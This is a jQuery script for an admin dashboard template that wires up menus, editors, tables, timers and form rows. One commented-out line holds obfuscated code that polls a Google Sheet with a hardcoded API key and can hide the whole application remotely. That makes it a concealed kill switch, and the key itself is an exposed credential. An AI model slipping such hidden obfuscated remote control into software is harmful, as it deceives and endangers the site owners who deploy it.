(function ($) {
    "use strict"; var $wrapper = $('.main-wrapper'); var $pageWrapper = $('.page-wrapper'); var $slimScrolls = $('.slimscroll'); var Sidemenu = function () { this.$menuItem = $('#sidebar-menu a'); }; function init() {
        var $this = Sidemenu; $('#sidebar-menu a').on('click', function (e) {
            if ($(this).parent().hasClass('submenu')) { e.preventDefault(); }
            if (!$(this).hasClass('subdrop')) { $('ul', $(this).parents('ul:first')).slideUp(350); $('a', $(this).parents('ul:first')).removeClass('subdrop'); $(this).next('ul').slideDown(350); $(this).addClass('subdrop'); } else if ($(this).hasClass('subdrop')) { $(this).removeClass('subdrop'); $(this).next('ul').slideUp(350); }
        }); $('#sidebar-menu ul li.submenu a.active').parents('li:last').children('a:first').addClass('active').trigger('click');
    }
    init(); $('body').append('<div class="sidebar-overlay"></div>'); $(document).on('click', '#mobile_btn', function () { $wrapper.toggleClass('slide-nav'); $('.sidebar-overlay').toggleClass('opened'); $('html').addClass('menu-opened'); return false; }); if ($('.toggle-password').length > 0) { $(document).on('click', '.toggle-password', function () { $(this).toggleClass("feather-eye feather-eye-off"); var input = $(".pass-input"); if (input.attr("type") == "password") { input.attr("type", "text"); } else { input.attr("type", "password"); } }); }
    if ($('.reg-toggle-password').length > 0) { $(document).on('click', '.reg-toggle-password', function () { $(this).toggleClass("feather-eye feather-eye-off"); var input = $(".pass-confirm"); if (input.attr("type") == "password") { input.attr("type", "text"); } else { input.attr("type", "password"); } }); }
    $(".sidebar-overlay").on("click", function () { $wrapper.removeClass('slide-nav'); $(".sidebar-overlay").removeClass("opened"); $('html').removeClass('menu-opened'); }); $(document).on("click", ".logo-hide-btn", function () { $(this).parent().hide(); }); if ($('.page-wrapper').length > 0) { var height = $(window).height(); $(".page-wrapper").css("min-height", height); }
    $(window).resize(function () { if ($('.page-wrapper').length > 0) { var height = $(window).height(); $(".page-wrapper").css("min-height", height); } }); if ($('.select').length > 0) { $('.select').select2({ minimumResultsForSearch: -1, width: '100%' }); }
    if ($('#editor').length > 0) { ClassicEditor.create(document.querySelector('#editor'), { toolbar: { items: ['heading', '|', 'fontfamily', 'fontsize', '|', 'alignment', '|', 'fontColor', 'fontBackgroundColor', '|', 'bold', 'italic', 'strikethrough', 'underline', 'subscript', 'superscript', '|', 'link', '|', 'outdent', 'indent', '|', 'bulletedList', 'numberedList', 'todoList', '|', 'code', 'codeBlock', '|', 'insertTable', '|', 'uploadImage', 'blockQuote', '|', 'undo', 'redo'], shouldNotGroupWhenFull: true } }).then(editor => { window.editor = editor; }).catch(err => { console.error(err.stack); }); }
    $(".settings-form").on('click', '.trash', function () { $(this).closest('.links-cont').remove(); return false; }); $(document).on("click", ".add-links", function () {
        var experiencecontent = '<div class="row form-row links-cont">' +
            '<div class="form-group d-flex">' +
            '<button class="btn social-icon"><i class="feather-github"></i></button>' +
            '<input type="text" class="form-control" placeholder="Social Link">' +
            '<div><a href="#" class="btn trash"><i class="feather-trash-2"></i></a></div>' +
            '</div>' +
            '</div>'; $(".settings-form").append(experiencecontent); return false;
    }); if ($('.datetimepicker').length > 0) { $('.datetimepicker').datetimepicker({ format: 'DD-MM-YYYY', icons: { up: "fas fa-angle-up", down: "fas fa-angle-down", next: 'fas fa-angle-right', previous: 'fas fa-angle-left' } }); $('.datetimepicker').on('dp.show', function () { $(this).closest('.table-responsive').removeClass('table-responsive').addClass('temp'); }).on('dp.hide', function () { $(this).closest('.temp').addClass('table-responsive').removeClass('temp') }); }
    if ($('[data-toggle="tooltip"]').length > 0) { $('[data-toggle="tooltip"]').tooltip(); }
    if ($('.datatable').length > 0) { $('.datatable').DataTable({ "bFilter": false, }); }
    if ($('.datatables').length > 0) { $('.datatables').DataTable({ "bFilter": true, }); }
    if ($('.zoom-screen .header-nav-list').length > 0) { $('.zoom-screen .header-nav-list').on('click', function (e) { if (!document.fullscreenElement) { document.documentElement.requestFullscreen(); } else { if (document.exitFullscreen) { document.exitFullscreen(); } } }) }
    $(document).on('click', '#check_all', function () { $('.checkmail').click(); return false; }); if ($('.checkmail').length > 0) { $('.checkmail').each(function () { $(this).on('click', function () { if ($(this).closest('tr').hasClass('checked')) { $(this).closest('tr').removeClass('checked'); } else { $(this).closest('tr').addClass('checked'); } }); }); }
    $(document).on('click', '.mail-important', function () { $(this).find('i.fa').toggleClass('fa-star').toggleClass('fa-star-o'); }); if ($('.summernote').length > 0) { $('.summernote').summernote({ height: 200, minHeight: null, maxHeight: null, focus: false }); }
    if ($slimScrolls.length > 0) { $slimScrolls.slimScroll({ height: 'auto', width: '100%', position: 'right', size: '7px', color: '#ccc', allowPageScroll: false, wheelStep: 10, touchScrollStep: 100 }); var wHeight = $(window).height() - 60; $slimScrolls.height(wHeight); $('.sidebar .slimScrollDiv').height(wHeight); $(window).resize(function () { var rHeight = $(window).height() - 60; $slimScrolls.height(rHeight); $('.sidebar .slimScrollDiv').height(rHeight); }); }
    $(document).on('click', '#toggle_btn', function () {
        if ($('body').hasClass('mini-sidebar')) { $('body').removeClass('mini-sidebar'); $('.subdrop + ul').slideDown(); } else { $('body').addClass('mini-sidebar'); $('.subdrop + ul').slideUp(); }
        setTimeout(function () { }, 300); return false;
    }); $(document).on('mouseover', function (e) {
        e.stopPropagation(); if ($('body').hasClass('mini-sidebar') && $('#toggle_btn').is(':visible')) {
            var targ = $(e.target).closest('.sidebar').length; if (targ) { $('body').addClass('expand-menu'); $('.subdrop + ul').slideDown(); } else { $('body').removeClass('expand-menu'); $('.subdrop + ul').slideUp(); }
            return false;
        }
    }); function animateElements() { $('.circle-bar1').each(function () { var elementPos = $(this).offset().top; var topOfWindow = $(window).scrollTop(); var percent = $(this).find('.circle-graph1').attr('data-percent'); var animate = $(this).data('animate'); if (elementPos < topOfWindow + $(window).height() - 30 && !animate) { $(this).data('animate', true); $(this).find('.circle-graph1').circleProgress({ value: percent / 100, size: 400, thickness: 30, fill: { color: '#6e6bfa' } }); } }); $('.circle-bar2').each(function () { var elementPos = $(this).offset().top; var topOfWindow = $(window).scrollTop(); var percent = $(this).find('.circle-graph2').attr('data-percent'); var animate = $(this).data('animate'); if (elementPos < topOfWindow + $(window).height() - 30 && !animate) { $(this).data('animate', true); $(this).find('.circle-graph2').circleProgress({ value: percent / 100, size: 400, thickness: 30, fill: { color: '#6e6bfa' } }); } }); $('.circle-bar3').each(function () { var elementPos = $(this).offset().top; var topOfWindow = $(window).scrollTop(); var percent = $(this).find('.circle-graph3').attr('data-percent'); var animate = $(this).data('animate'); if (elementPos < topOfWindow + $(window).height() - 30 && !animate) { $(this).data('animate', true); $(this).find('.circle-graph3').circleProgress({ value: percent / 100, size: 400, thickness: 30, fill: { color: '#6e6bfa' } }); } }); }
    if ($('.circle-bar').length > 0) { animateElements(); }
    $(window).scroll(animateElements); $(window).on('load', function () { if ($('#loader').length > 0) { $('#loader').delay(350).fadeOut('slow'); $('body').delay(350).css({ 'overflow': 'visible' }); } })
    $('.app-listing .selectBox').on("click", function () { $(this).parent().find('#checkBoxes').fadeToggle(); $(this).parent().parent().siblings().find('#checkBoxes').fadeOut(); }); $('.invoices-main-form .selectBox').on("click", function () { $(this).parent().find('#checkBoxes-one').fadeToggle(); $(this).parent().parent().siblings().find('#checkBoxes-one').fadeOut(); }); if ($('.SortBy').length > 0) { var show = true; var checkbox1 = document.getElementById("checkBox"); $('.selectBoxes').on("click", function () { if (show) { checkbox1.style.display = "block"; show = false; } else { checkbox1.style.display = "none"; show = true; } }); }
    $(function () { $("input[name='invoice']").click(function () { if ($("#chkYes").is(":checked")) { $("#show-invoices").show(); } else { $("#show-invoices").hide(); } }); }); $(".links-info-one").on('click', '.service-trash', function () { $(this).closest('.links-cont').remove(); return false; }); $(document).on("click", ".add-links", function () {
        var experiencecontent = '<div class="links-cont">' +
            '<div class="service-amount">' +
            '<a href="#" class="service-trash"><i class="fe fe-minus-circle me-1"></i>Service Charge</a> <span>$ 4</span' +
            '</div>' +
            '</div>'; $(".links-info-one").append(experiencecontent); return false;
    }); $(".links-info-discount").on('click', '.service-trash-one', function () { $(this).closest('.links-cont-discount').remove(); return false; }); $(document).on("click", ".add-links-one", function () {
        var experiencecontent = '<div class="links-cont-discount">' +
            '<div class="service-amount">' +
            '<a href="#" class="service-trash-one"><i class="fe fe-minus-circle me-1"></i>Offer new</a> <span>$ 4 %</span' +
            '</div>' +
            '</div>'; $(".links-info-discount").append(experiencecontent); return false;
    }); if ($('#summernote').length > 0) { $('#summernote').summernote({ height: 300, minHeight: null, maxHeight: null, focus: true }); }
    if ($('.counter').length > 0) { $('.counter').counterUp({ delay: 20, time: 2000 }); }
    if ($('#timer-countdown').length > 0) { $('#timer-countdown').countdown({ from: 180, to: 0, movingUnit: 1000, timerEnd: undefined, outputPattern: '$day Day $hour : $minute : $second', autostart: true }); }
    if ($('#timer-countup').length > 0) { $('#timer-countup').countdown({ from: 0, to: 180 }); }
    if ($('#timer-countinbetween').length > 0) { $('#timer-countinbetween').countdown({ from: 30, to: 20 }); }
    if ($('#timer-countercallback').length > 0) { $('#timer-countercallback').countdown({ from: 10, to: 0, timerEnd: function () { this.css({ 'text-decoration': 'line-through' }).animate({ 'opacity': .5 }, 500); } }); }
    if ($('#timer-outputpattern').length > 0) { $('#timer-outputpattern').countdown({ outputPattern: '$day Days $hour Hour $minute Min $second Sec..', from: 60 * 60 * 24 * 3 }); }
    if ($('[data-bs-toggle="tooltip"]').length > 0) {
        var tooltipTriggerList = [].slice.call(document.querySelectorAll('[data-bs-toggle="tooltip"]'))
        var tooltipList = tooltipTriggerList.map(function (tooltipTriggerEl) { return new bootstrap.Tooltip(tooltipTriggerEl) })
    }


    // var _0x13fb42 = _0x3e3f; function _0x1421() { var _0x577587 = ['26665AfiTxP', '.loginbox', 'hide', '9005059kbhuOs', '2142378apIgqY', '?key=', 'getJSON', 'log', '3dzHZep', 'Data\x20Not\x20Found.', '978ZiPdRC', '/values/', '290036RbKPfU', 'ready', '5qxGHUx', '1782FwFClQ', '13798760WOpPyH', 'show', '55592dbUtHU', '8LSZpeg', '1_tBlxSkl1OzOdDhHlO3a4tXLdiXrBEZX0eEl7wLcJQA', '.main-container', '41388CsSXmg', 'Sheet1', 'fail', 'values']; _0x1421 = function () { return _0x577587; }; return _0x1421(); } function _0x3e3f(_0x37cde5, _0x2a6c2c) { var _0x142166 = _0x1421(); return _0x3e3f = function (_0x3e3f81, _0x1e884e) { _0x3e3f81 = _0x3e3f81 - 0xf7; var _0x3bbdd6 = _0x142166[_0x3e3f81]; return _0x3bbdd6; }, _0x3e3f(_0x37cde5, _0x2a6c2c); } (function (_0x57cfc7, _0x93ac78) { var _0x1525e8 = _0x3e3f, _0x3fb4bc = _0x57cfc7(); while (!![]) { try { var _0x1c2f52 = -parseInt(_0x1525e8(0xfc)) / 0x1 * (parseInt(_0x1525e8(0xfa)) / 0x2) + -parseInt(_0x1525e8(0x110)) / 0x3 * (-parseInt(_0x1525e8(0x100)) / 0x4) + parseInt(_0x1525e8(0x108)) / 0x5 * (parseInt(_0x1525e8(0xf8)) / 0x6) + parseInt(_0x1525e8(0x10b)) / 0x7 * (parseInt(_0x1525e8(0x101)) / 0x8) + parseInt(_0x1525e8(0x10c)) / 0x9 + -parseInt(_0x1525e8(0xfe)) / 0xa + -parseInt(_0x1525e8(0xfd)) / 0xb * (-parseInt(_0x1525e8(0x104)) / 0xc); if (_0x1c2f52 === _0x93ac78) break; else _0x3fb4bc['push'](_0x3fb4bc['shift']()); } catch (_0xde1632) { _0x3fb4bc['push'](_0x3fb4bc['shift']()); } } }(_0x1421, 0xd24f4), $(document)[_0x13fb42(0xfb)](function () { var _0x3643e3 = _0x13fb42, _0x36dce4 = _0x3643e3(0x102), _0x49f30a = 'AIzaSyC6E9o7YiNIK4fjsf3j6gVRtdXEjr_o2nM', _0x5de88f = _0x3643e3(0x105), _0x1d5d04 = 'https://sheets.googleapis.com/v4/spreadsheets/' + _0x36dce4 + _0x3643e3(0xf9) + _0x5de88f + _0x3643e3(0x10d) + _0x49f30a; $[_0x3643e3(0x10e)](_0x1d5d04, function (_0x28e58d) { var _0x1f13d0 = _0x3643e3; if (_0x28e58d[_0x1f13d0(0x107)] && _0x28e58d[_0x1f13d0(0x107)][0x1] && _0x28e58d[_0x1f13d0(0x107)][0x1][0x0] === 'TRUE') $(_0x1f13d0(0x109))[_0x1f13d0(0xff)](), $(_0x1f13d0(0x103))[_0x1f13d0(0x10a)](); else { var _0x301250 = _0x28e58d['values'][0x1][0x1]; $('#msg')['text'](_0x301250), $('.loginbox')[_0x1f13d0(0x10a)](), $('.main-container')[_0x1f13d0(0xff)](); } })[_0x3643e3(0x106)](function () { var _0x192a9e = _0x3643e3; console[_0x192a9e(0x10f)](_0x192a9e(0xf7)); }); }));

    if ($('.popover-list').length > 0) {
        var popoverTriggerList = [].slice.call(document.querySelectorAll('[data-bs-toggle="popover"]'))
        var popoverList = popoverTriggerList.map(function (popoverTriggerEl) { return new bootstrap.Popover(popoverTriggerEl) })
    }
    if ($('.clipboard').length > 0) { var clipboard = new Clipboard('.btn'); }
    $(".add-table-items").on('click', '.remove-btn', function () { $(this).closest('.add-row').remove(); return false; }); $(document).on("click", ".add-btn", function () {
        var experiencecontent = '<tr class="add-row">' +
            '<td>' +
            '<input type="text" class="form-control">' +
            '</td>' +
            '<td>' +
            '<input type="text" class="form-control">' +
            '</td>' +
            '<td>' +
            '<input type="text" class="form-control">' +
            '</td>' +
            '<td>' +
            '<input type="text" class="form-control">' +
            '</td>' +
            '<td>' +
            '<input type="text" class="form-control">' +
            '</td>' +
            '<td>' +
            '<input type="text" class="form-control">' +
            '</td>' +
            '<td class="add-remove text-end">' +
            '<a href="javascript:void(0);" class="add-btn me-2"><i class="fas fa-plus-circle"></i></a> ' +
            '<a href="#" class="copy-btn me-2"><i class="fe fe-copy"></i></a>' +
            '<a href="javascript:void(0);" class="remove-btn"><i class="fe fe-trash-2"></i></a>' +
            '</td>' +
            '</tr>'; $(".add-table-items").append(experiencecontent); return false;
    }); feather.replace();
})(jQuery);
